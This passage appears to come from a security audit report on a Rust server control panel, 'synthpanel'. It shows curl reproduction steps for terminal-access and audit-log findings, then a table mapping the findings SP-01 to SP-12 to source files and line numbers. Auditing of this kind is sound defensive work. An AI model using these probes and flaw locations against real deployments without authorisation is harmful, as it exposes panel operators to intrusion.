  -H 'content-type: application/json' -H "x-csrf-token: $CSRF" -d '{}' "$BASE/api/v1/terminal/open"
# 403
```

**SP-03 — the audit log**

```sh
curl -sk -b cookies.txt "$BASE/api/v1/audit?limit=20"
# "cron.create" appears twice: once with actor_id null and ip null,
# once with the actor — and the core-side entry is the one an investigator
# would find first.
```

---

## Appendix B — files that carry the findings

| File | Lines | Finding |
| --- | --- | --- |
| `crates/synthpanel-core/src/ipc.rs` | 149, 1496, 1517, 1532, 1539, 1546, 1553, 1792, 2362 | SP-01, SP-02, SP-03, SP-06 |
| `crates/synthpanel-core/src/config.rs` | 49, 54 | SP-01 |
| `crates/synthpanel-core/src/cron.rs` | 369 | SP-02 |
| `crates/synthpanel-core/src/deploy.rs` | 99, 154, 494 | SP-02 |
| `crates/synthpanel-core/src/update.rs` | 352 | SP-02 |
| `crates/synthpanel-core/src/security.rs` | 294 | SP-02 |
| `crates/synthpanel-core/src/backup.rs` | 130, 765, 793 | SP-07 |
| `crates/synthpanel-core/src/sites.rs` | 228 | SP-12 |
| `crates/synthpanel-web/src/api/files.rs` | 96, 116 | SP-01, SP-06 |
| `crates/synthpanel-web/src/api/cron.rs` | 59, 123 | SP-02 |
| `crates/synthpanel-web/src/api/deployments.rs` | 66, 151 | SP-02 |
| `crates/synthpanel-web/src/api/security.rs` | 73, 146 | SP-02 |
| `crates/synthpanel-web/src/api/update.rs` | 49, 75 | SP-02 |
| `crates/synthpanel-web/src/api/auth.rs` | 51, 202, 378 | SP-03, SP-05, SP-09 |
| `crates/synthpanel-web/src/api/admin.rs` | 105, 143, 179 | SP-02, SP-11 |
| `crates/synthpanel-web/src/extract.rs` | 44, 52, 66 | SP-03, SP-08, SP-09 |
| `crates/synthpanel-web/src/session.rs` | 75, 96 | SP-04, SP-10 |
| `crates/synthpanel-web/src/middleware.rs` | 69, 112 | (checked — sound) |
| `crates/synthpanel-web/src/totp.rs` | 34 | SP-10 |
| `crates/synthpanel-ipc/src/lib.rs` | 20 | SP-03 |
